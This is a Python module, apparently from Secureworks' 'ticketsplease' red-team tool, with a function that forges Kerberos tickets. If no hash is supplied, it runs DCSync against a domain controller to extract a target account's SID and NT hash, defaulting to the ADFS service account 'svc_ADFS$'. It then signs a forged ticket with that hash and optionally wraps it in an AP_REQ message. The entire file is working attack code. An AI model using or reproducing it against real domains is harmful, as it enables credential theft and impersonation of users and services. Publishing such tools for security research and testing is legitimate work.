# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from ticketsplease.modules.ticket.ap_req import KRB_AP_REQ
from ticketsplease.modules.ticket.krb_tgt import KRB_TGT
from ticketsplease.modules.ticket.impacketx import TICKETER

import base64
import asyncio
from typing import Tuple
from pyasn1.codec.der import encoder  # type: ignore
from ticketsplease.core import gen_nt_hash
from ticketsplease.modules.ldap import LDAP
from ticketsplease.modules.dcsync import DCSYNC


def create_ticket(
    domain: str = None,
    host: str = None,
    user: str = None,
    user_sid: str = None,
    user_password: str = None,
    user_hash: str = None,
    domain_username: str = None,
    domain_password: str = None,
    domain_hash: str = None,
    dc_ip: str = None,
    ap_req: bool = False,
) -> Tuple:
    """Generate a KRB_TGT - if specified, wrap in a KRB_AP_REQ message.

    Arguments:
        domain: target domain (i.e. company.com)
        host: spn host differing from the domain
        user: target user
        user_sid: target user's SID
        user_password: target user's password
        user_hash: target user's password hash
        domain_username: username to perform DCSync/LDAP
        domain_password: password to perform DCSync/LDAP
        domain_hash: password hash to perform DCSync/LDAP
        dc_ip: IP address of Domain Controller for DCSync/LDAP
        ap_req: bool to wrap ticket in AP_REQ message

    Returns:
        base64 encoded KRB ticket, cipher, and sessionKey

    Raises:
        ValueError: if missing or mismatched arguments
    """
    # Handle data validation conditionals here
    # Username or SID required for ticket
    if not user and not user_sid:
        raise ValueError("missing user or user_sid argument")
    # Username or password/hash (along with SID) required for ticket
    if not user and (not user_password and not user_hash):
        raise ValueError("missing user or password/hash arguments")
    # If we need to DCSync, require DCSync auth values
    if not user_sid or (not user_password and not user_hash):
        if not domain_username:
            raise ValueError("missing domain username")
        if not dc_ip:
            raise ValueError("missing Domain Controller IP")
        if not domain_password and not domain_hash:
            raise ValueError("missing domain user password or hash")

    # Defaults
    if not domain:
        domain = "company.com"
    if not user:
        user = "svc_ADFS$"

    # The user SID and hash are used to generate the Kerberos
    # ticket. The SID is used for identification and the hash
    # is used to sign the ticket. If the SID and hash are for
    # differing users, they must be retrieved and provided
    # separately as this method only handles retrieving both
    # values for a single user.

    # Perform DCSync to get the SID and password hash
    # of the target user if not provided
    if not user_password and not user_hash:
        (user_sid, user_hash) = asyncio.run(
            DCSYNC.run(
                dc_ip=dc_ip,
                domain=domain,
                target_user=user,
                username=domain_username,
                password=domain_password,
                hash=domain_hash,
            )
        )
    # Skip DCSync if we only need to grab the target user's SID
    elif not user_sid:
        (_, _, user_sid) = LDAP.get_user(
            domain=domain,
            host=dc_ip,
            user=domain_username,
            password=domain_password,
            target_user=user,
        )

    # Convert the password to an NT Hash
    if user_password and not user_hash:
        user_hash = gen_nt_hash(user_password)

    # Allow for a host that differs from domain to be
    # provided
    if not host:
        host = domain

    # Create an SPN
    spn = f"host/{host.lower()}"

    # Build the KRB_TGT
    (ticket, cipher, sessionKey) = KRB_TGT.run(
        user=user,
        spn=spn,
        domain=domain,
        sid=user_sid,
        hash=user_hash,
    )

    if ap_req:
        # Build KBR_AP_REQ message
        ap_req_message = KRB_AP_REQ.run(
            tgt=ticket,
            cipher=cipher,
            sessionKey=sessionKey,
            spn=spn,
            domain=domain,
        )

        krb_ticket = base64.b64encode(ap_req_message).decode()
    else:
        ticket = encoder.encode(ticket)
        krb_ticket = base64.b64encode(ticket).decode()

    return (krb_ticket, cipher, sessionKey)
